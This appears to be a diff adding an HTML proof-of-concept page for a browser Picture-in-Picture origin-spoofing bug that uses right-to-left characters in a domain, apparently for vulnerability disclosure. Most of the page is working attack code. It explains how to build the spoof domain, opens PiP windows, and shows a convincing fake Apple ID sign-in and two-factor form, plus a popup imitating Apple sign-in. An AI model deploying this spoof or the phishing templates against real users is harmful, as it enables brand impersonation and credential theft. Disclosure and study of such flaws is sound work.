@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Picture-in-Picture Origin Spoof - POC</title>
+<style>
+  :root { --bg: #0a0a0f; --card: #12121a; --border: #1e1e30; --accent: #6c5ce7; --green: #00d2a0; --red: #ff4757; --text: #e2e2f0; --muted: #7878a0; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); padding: 24px; }
+  .container { max-width: 860px; margin: 0 auto; }
+  h1 { font-size: 22px; margin-bottom: 6px; color: #fff; }
+  h1 span { color: var(--red); }
+  .badge { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 11px; font-weight: 600; }
+  .badge-vuln { background: rgba(255,71,87,0.15); color: var(--red); }
+  .badge-info { background: rgba(108,92,231,0.15); color: var(--accent); }
+  .card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px 24px; margin-bottom: 16px; }
+  .card h3 { font-size: 15px; margin-bottom: 10px; color: #fff; display: flex; align-items: center; gap: 8px; }
+  button { padding: 10px 18px; border: 1px solid var(--border); background: var(--card); color: var(--text); border-radius: 6px; cursor: pointer; font-size: 13px; margin: 4px; transition: all 0.15s; }
+  button:hover { border-color: var(--accent); background: #1a1a2e; }
+  button.danger { border-color: var(--red); color: var(--red); }
+  button.danger:hover { background: rgba(255,71,87,0.1); }
+  button.primary { border-color: var(--accent); color: var(--accent); }
+  button.primary:hover { background: rgba(108,92,231,0.1); }
+  video { max-width: 280px; border-radius: 6px; margin: 8px 0; border: 1px solid var(--border); }
+  pre { background: #0d0d16; padding: 14px; border-radius: 6px; font-size: 12px; overflow-x: auto; color: var(--muted); border: 1px solid var(--border); }
+  .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 12px; }
+  .info-item { background: #0d0d16; padding: 10px 12px; border-radius: 6px; border: 1px solid var(--border); }
+  .info-item .label { color: var(--muted); margin-bottom: 2px; }
+  .info-item .value { color: var(--text); font-family: monospace; word-break: break-all; }
+  #log { max-height: 200px; overflow-y: auto; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 11px; line-height: 1.5; }
+  .log-warn { color: var(--red); }
+  .log-ok { color: var(--green); }
+  .steps { counter-reset: step; }
+  .steps li { counter-increment: step; list-style: none; padding: 8px 0 8px 32px; position: relative; border-left: 1px solid var(--border); margin-left: 8px; }
+  .steps li::before { content: counter(step); position: absolute; left: -13px; top: 6px; width: 24px; height: 24px; background: var(--accent); color: #fff; border-radius: 50%; text-align: center; line-height: 24px; font-size: 12px; font-weight: 600; }
+</style>
+</head>
+<body>
+<div class="container">
+
+<h1>Picture-in-Picture <span>Origin Spoofing</span> via RTL Characters</h1>
+<p style="color:var(--muted);margin-bottom:20px;">
+  <span class="badge badge-vuln">Security UI Spoofing</span>
+  <span class="badge badge-info">Chrome 143+</span>
+  <span class="badge badge-info">CWE-451</span>
+</p>
+
+<!-- Attack Info -->
+<div class="card">
+  <h3>Attack Summary</h3>
+  <p style="font-size:13px;color:var(--muted);line-height:1.6;">
+    When a website uses <strong>Right-to-Left (RTL) Unicode characters</strong> in its domain,
+    the browser's Picture-in-Picture (PiP) window displays a <strong>visually misleading origin</strong>.
+    Instead of showing the true root domain, the PiP UI appears to show trusted brands
+    (apple.com, google.com), enabling <strong>origin impersonation and phishing</strong>.
+  </p>
+</div>
+
+<!-- Live Info -->
+<div class="info-grid">
+  <div class="info-item">
+    <div class="label">Current URL</div>
+    <div class="value" id="curUrl">-</div>
+  </div>
+  <div class="info-item">
+    <div class="label">Current Origin (eTLD+1)</div>
+    <div class="value" id="curOrigin">-</div>
+  </div>
+  <div class="info-item">
+    <div class="label">PiP Expected Origin</div>
+    <div class="value" id="pipExpected" style="color:var(--red);">-</div>
+  </div>
+  <div class="info-item">
+    <div class="label">Browser</div>
+    <div class="value" id="browserVersion">-</div>
+  </div>
+</div>
+
+<!-- Video PiP Attack -->
+<div class="card">
+  <h3>1. Video Picture-in-Picture Attack</h3>
+  <p style="font-size:12px;color:var(--muted);margin-bottom:10px;">
+    Click the button below to open a video in PiP mode. <strong>Observe the origin displayed in the PiP title bar</strong>.
+    Due to RTL characters in the domain, the visible origin will be misleading.
+  </p>
+  <button class="primary" onclick="attackVideoPiP()">Open Video PiP (Observe Origin)</button>
+  <button onclick="attackVideoPiPCrossOrigin()">Cross-Origin Video PiP</button>
+  <div id="videoContainer"></div>
+</div>
+
+<!-- Document PiP Attack -->
+<div class="card">
+  <h3>2. Document Picture-in-Picture Attack (Phishing Demo)</h3>
+  <p style="font-size:12px;color:var(--muted);margin-bottom:10px;">
+    Document PiP shows a custom window. The origin label in the title bar is <strong>spoofed</strong>.
+    Below is a phishing page that appears to be from a trusted brand while actually hosted on an attacker domain.
+  </p>
+  <button class="danger" onclick="attackDocPiPPhishing()">Open Phishing PiP Window</button>
+  <button onclick="attackDocPiP()">Open Minimal Doc PiP</button>
+</div>
+
+<!-- Attack Scenario Walkthrough -->
+<div class="card">
+  <h3>3. Attack Scenario</h3>
+  <ol class="steps" style="font-size:13px;color:var(--muted);line-height:1.6;">
+    <li><strong>Attacker registers</strong> a domain with RTL characters in subdomains (e.g., <code>xn--mgb.accounts.login.apple.com.xn--mgb.https.google.com.summa.sbs</code>)</li>
+    <li><strong>Victim visits</strong> the malicious URL (e.g., from a phishing email or ad)</li>
+    <li>The page <strong>automatically opens</strong> a PiP window playing a video or showing content</li>
+    <li>The PiP window's origin label shows <strong>"apple.com"</strong> instead of the real root domain <strong>"summa.sbs"</strong></li>
+    <li><strong>Victim trusts</strong> the PiP content believing it's from a legitimate source</li>
+  </ol>
+</div>
+
+<!-- Domain Construction -->
+<div class="card">
+  <h3>4. How the Domain Spoof Works</h3>
+  <pre>Decoded domain:
+<span style="color:#ff4757">ا</span>.accounts.login.apple.com.<span style="color:#ff4757">ا</span>.https.google.com.<span style="color:#00d2a0">summa.sbs</span>
+
+Punycode (what DNS sees):
+xn--mgb.accounts.login.apple.com.xn--mgb.https.google.com.summa.sbs
+
+The Arabic Alef character (<span style="color:#ff4757">U+0627</span>) is a strong RTL character.
+It triggers the Unicode bidirectional algorithm to visually reorder text,
+making <strong>summa.sbs</strong> appear as <strong>apple.com</strong> in the PiP UI.</pre>
+</div>
+
+<!-- Test Variations -->
+<div class="card">
+  <h3>5. Bypass Variations</h3>
+  <button onclick="testPermissionPrompt()">Test Permission Prompt Origin</button>
+  <button onclick="testNamedPopup()">Test Named Popup</button>
+  <button onclick="testFullscreen()">Test Fullscreen Exit UI</button>
+  <button onclick="testBlobPiP()">Blob URL PiP Test</button>
+</div>
+
+<!-- Logger -->
+<div class="card">
+  <h3>Event Log</h3>
+  <pre id="log">Ready. Click attack buttons above to test.</pre>
+</div>
+
+</div>
+
+<script>
+const VIDEO_SRC = 'https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4';
+
+// Display current state
+(function init() {
+  document.getElementById('curUrl').textContent = window.location.href;
+  document.getElementById('curOrigin').textContent = window.location.hostname;
+  document.getElementById('pipExpected').textContent = 'WILL SHOW SPOOFED ORIGIN IN PiP';
+  document.getElementById('browserVersion').textContent = navigator.userAgent.match(/Chrome\/(\d+)/)?.[0] || navigator.userAgent;
+
+  // Detect if accessed through RTL domain
+  const hostname = window.location.hostname;
+  const hasPunycode = hostname.includes('xn--');
+  if (hasPunycode) {
+    try {
+      const decoded = hostname.split('.').map(p => p.startsWith('xn--') ? '«' + p + '»' : p).join('.');
+      addLog('RTL domain detected! Punycode: ' + hostname, 'warn');
+    } catch(e) {}
+  } else {
+    addLog('NOT on RTL domain. For full POC effect, access via the RTL domain.', 'warn');
+    addLog('The PiP origin spoof only works when accessed through an RTL-encoded domain.');
+  }
+})();
+
+function addLog(msg, cls) {
+  const log = document.getElementById('log');
+  const time = new Date().toLocaleTimeString();
+  const prefix = cls === 'warn' ? '[!]' : cls === 'ok' ? '[+]' : '[*]';
+  log.innerHTML += `\n${prefix} ${time} ${msg}`;
+  log.scrollTop = log.scrollHeight;
+}
+
+// ==== VIDEO PIP ATTACKS ====
+async function attackVideoPiP() {
+  addLog('Launching Video PiP attack...', 'warn');
+  const v = document.createElement('video');
+  v.src = VIDEO_SRC;
+  v.controls = true;
+  v.crossOrigin = 'anonymous';
+  v.style.maxWidth = '280px';
+  document.getElementById('videoContainer').appendChild(v);
+
+  try {
+    await v.play();
+    if (v.requestPictureInPicture) {
+      const pipWin = await v.requestPictureInPicture();
+      addLog('PiP OPENED! Check the title bar origin - it shows the SPOOFED origin', 'warn');
+      addLog('Expected display: apple.com / google.com (TRUSTED brands)', 'warn');
+      addLog('Actual origin: ' + window.location.hostname, 'ok');
+    } else {
+      addLog('Video PiP not supported', 'warn');
+    }
+  } catch(e) {
+    addLog('Error: ' + e.message, 'warn');
+  }
+}
+
+async function attackVideoPiPCrossOrigin() {
+  addLog('Launching cross-origin video PiP...');
+  const v = document.createElement('video');
+  v.src = 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4';
+  v.controls = true;
+  v.crossOrigin = 'anonymous';
+  document.getElementById('videoContainer').appendChild(v);
+
+  try {
+    await v.play();
+    await v.requestPictureInPicture();
+    addLog('Cross-origin PiP opened - check if origin matches page or video source');
+  } catch(e) {
+    addLog('Error: ' + e.message, 'warn');
+  }
+}
+
+// ==== DOCUMENT PIP ATTACKS ====
+async function attackDocPiP() {
+  if (!('documentPictureInPicture' in window)) {
+    addLog('Document PiP not supported in this browser', 'warn');
+    return;
+  }
+  addLog('Opening Document PiP...');
+  try {
+    const pipWin = await documentPictureInPicture.requestWindow({ width: 400, height: 300 });
+    pipWin.document.body.innerHTML = `
+      <style>body{margin:0;background:#1a1a2e;color:#eee;display:flex;align-items:center;justify-content:center;height:100vh;font-family:system-ui;flex-direction:column}
+      h2{color:#f0f} .origin{font-family:monospace;padding:8px 16px;background:#16213e;border-radius:6px;margin:8px}</style>
+      <h2>Document PiP Active</h2>
+      <div class="origin">Window Origin: ${pipWin.origin}</div>
+      <div class="origin">Parent Origin: ${window.origin}</div>
+    `;
+    addLog('Doc PiP opened - CHECK ORIGIN LABEL IN TITLE BAR', 'warn');
+  } catch(e) {
+    addLog('Error: ' + e.message, 'warn');
+  }
+}
+
+async function attackDocPiPPhishing() {
+  if (!('documentPictureInPicture' in window)) {
+    addLog('Document PiP not supported', 'warn');
+    return;
+  }
+  addLog('Opening PHISHING PiP window...', 'warn');
+  try {
+    const pipWin = await documentPictureInPicture.requestWindow({ width: 360, height: 480 });
+    pipWin.document.body.innerHTML = `
+      <style>
+        body { margin:0; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; background:linear-gradient(180deg,#f5f5f7 0%,#fff 100%); display:flex;align-items:center;justify-content:center;height:100vh; }
+        .card { background:#fff; padding:30px 28px; border-radius:18px; box-shadow:0 4px 24px rgba(0,0,0,.08); width:300px; text-align:center; }
+        .logo { font-size:44px; margin-bottom:6px; }
+        h3 { font-size:20px; color:#1d1d1f; margin:6px 0; font-weight:600; }
+        .subtitle { color:#86868b; font-size:13px; margin-bottom:16px; }
+        input { width:100%; padding:11px 14px; margin:7px 0; border:1px solid #d2d2d7; border-radius:10px; font-size:14px; box-sizing:border-box; outline:none; }
+        input:focus { border-color:#0071e3; box-shadow:0 0 0 3px rgba(0,113,227,.15); }
+        .btn { width:100%; padding:12px; background:#0071e3; color:#fff; border:none; border-radius:10px; font-size:15px; font-weight:500; cursor:pointer; margin-top:12px; }
+        .btn:hover { background:#0077ed; }
+        .note { font-size:11px; color:#86868b; margin-top:14px; line-height:1.4; }
+        .divider { display:flex;align-items:center;gap:10px;margin:16px 0;color:#86868b;font-size:11px; }
+        .divider::before,.divider::after { content:'';flex:1;border-top:1px solid #d2d2d7; }
+      </style>
+      <div class="card">
+        <div class="logo">🍎</div>
+        <h3>Apple ID</h3>
+        <p class="subtitle">Sign in to continue to Apple Services</p>
+        <input type="text" placeholder="Email or Phone Number" autocomplete="off" id="phishEmail">
+        <input type="password" placeholder="Password" autocomplete="off" id="phishPass">
+        <button class="btn" onclick="handlePhishSubmit()">Sign In</button>
+        <p class="note">Your Apple ID is used to access all Apple services.<br>Your information is encrypted and secure.</p>
+        <div class="divider">or</div>
+        <button style="width:100%;padding:12px;background:#fff;border:1px solid #d2d2d7;border-radius:10px;font-size:14px;cursor:pointer;">Create New Apple ID</button>
+      </div>
+      <script>
+        function handlePhishSubmit() {
+          const email = document.getElementById('phishEmail').value;
+          const pass = document.getElementById('phishPass').value;
+          if (!email || !pass) {
+            document.querySelector('.subtitle').textContent = 'Please fill in all fields';
+            document.querySelector('.subtitle').style.color = '#ff4757';
+            return;
+          }
+          const btn = document.querySelector('.btn');
+          btn.textContent = 'Verifying...';
+          btn.style.opacity = '0.7';
+          setTimeout(() => {
+            document.querySelector('.card').innerHTML = '<h3 style=color:#16a34a>Verification Required</h3><p style=color:#86868b;font-size:13px>Enter the 6-digit code sent to your device.</p><input type=text placeholder=000000 style="width:100%;text-align:center;font-size:24px;letter-spacing:8px"><button class=btn style=margin-top:12px>Verify</button>';
+          }, 1500);
+        }
+      <\/script>
+    `;
+    addLog('PHISHING PiP OPENED! Title bar shows SPOOFED trusted origin', 'warn');
+    addLog('In real attack, victim sees "apple.com" and trusts the phishing page', 'warn');
+  } catch(e) {
+    addLog('Error: ' + e.message, 'warn');
+  }
+}
+
+// ==== BYPASS VARIATIONS ====
+function testPermissionPrompt() {
+  addLog('Triggering permission prompt - check origin in permission bar...');
+  // Notification
+  if ('Notification' in window) {
+    Notification.requestPermission().then(r => {
+      addLog('Notification permission result: ' + r + ' - check prompt origin', r === 'granted' ? 'ok' : 'warn');
+    });
+  }
+  // Geolocation
+  navigator.geolocation.getCurrentPosition(
+    p => addLog('Geo granted - check permission prompt origin', 'ok'),
+    e => addLog('Geo denied - check permission bar origin', 'warn'),
+    { timeout: 5000 }
+  );
+}
+
+function testNamedPopup() {
+  addLog('Opening named popup...');
+  const w = window.open('', 'Apple-SignIn', 'width=450,height=500');
+  if (w) {
+    w.document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Apple ID</title><style>body{font-family:-apple-system,sans-serif;background:#f5f5f7;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}.card{background:white;padding:32px;border-radius:16px;box-shadow:0 2px 12px rgba(0,0,0,.1);width:300px;text-align:center}h2{color:#1d1d1f}</style></head><body><div class="card"><h2>Apple ID Sign In</h2><p style=color:#86868b>Enter your credentials</p><input placeholder="Apple ID" style=width:100%;padding:10px;margin:8px_0;border:1px_solid_#ccc;border-radius:6px><input type=password placeholder=Password style=width:100%;padding:10px;margin:8px_0;border:1px_solid_#ccc;border-radius:6px><button style=width:100%;padding:12px;background:#0071e3;color:white;border:none;border-radius:6px;font-size:15px>Sign In</button></div></body></html>');
+    addLog('Popup opened - check address bar for real origin', 'ok');
+  } else {
+    addLog('Popup blocked', 'warn');
+  }
+}
+
+async function testFullscreen() {
+  addLog('Entering fullscreen - check the exit instruction UI...');
+  try {
+    await document.documentElement.requestFullscreen();
+    addLog('Fullscreen entered. Press ESC - observe "Exit fullscreen" UI for origin text', 'ok');
+  } catch(e) {
+    addLog('Fullscreen denied: ' + e.message, 'warn');
+  }
+}
+
+async function testBlobPiP() {
+  addLog('Testing blob URL PiP...');
+  const resp = await fetch(VIDEO_SRC);
+  const blob = await resp.blob();
+  const blobUrl = URL.createObjectURL(blob);
+  const v = document.createElement('video');
+  v.src = blobUrl;
+  v.controls = true;
+  document.getElementById('videoContainer').appendChild(v);
+  try {
+    await v.play();
+    await v.requestPictureInPicture();
+    addLog('Blob PiP opened - what origin appears?', 'ok');
+  } catch(e) {
+    addLog('Error: ' + e.message, 'warn');
+  }
+}
+</script>
+</body>
+</html>
